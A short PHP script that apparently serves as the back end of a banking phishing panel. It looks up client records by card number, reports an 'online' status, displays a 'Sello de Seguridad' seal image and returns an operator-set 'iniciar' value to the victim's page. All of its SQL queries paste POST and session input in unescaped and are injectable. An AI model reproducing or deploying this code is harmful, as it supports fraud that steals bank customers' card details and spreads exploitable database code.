<?php
error_reporting(0);
session_start();

@include("class/db.php");
$card = ($_SESSION["card"] ? $_SESSION["card"] : $_POST["id"]);
$numb = $_POST["numb"];

$idget = $_GET["idx"];

if($idget == "nombre"){
	$result = mysqli_query($link, "SELECT nombre FROM usuarios WHERE card='".$card."'");
	$row = $result->fetch_array(MYSQLI_NUM);
	echo $row[0];
	exit;
}

if($idget == "online"){
	$result = mysqli_query($link, "UPDATE usuarios SET line='".$numb."' WHERE card='".$card."'");
	exit;
}

if($idget == "imagen"){
	$result = mysqli_query($link, "SELECT nombre, img FROM usuarios WHERE card='".$card."'");
	$row = $result->fetch_array(MYSQLI_NUM);
	echo "<p style=\"float:left; margin-top:30px; margin-right:10px;\" class=\"dax\"><span>CLIENTE: </span>".strtoupper((trim($row[0]) ? $row[0] : "Cargando Información..."))."</p><div id=\"cont_sello_seguridad\"><img style=\"border:1px solid #8B8B8B; border-radius: 5px;\" src=\"rob0t/img/".(trim($row[1]) ? $row[1] : "0").".png\" alt=\"Sello de Seguridad\" width=\"58\" height=\"58\"></div>";
	exit;
}

$result = mysqli_query($link, "SELECT iniciar FROM usuarios WHERE card='".$card."'");
$row = $result->fetch_array(MYSQLI_NUM);
echo ($row[0] != "" ? $row[0] : "Login");
?>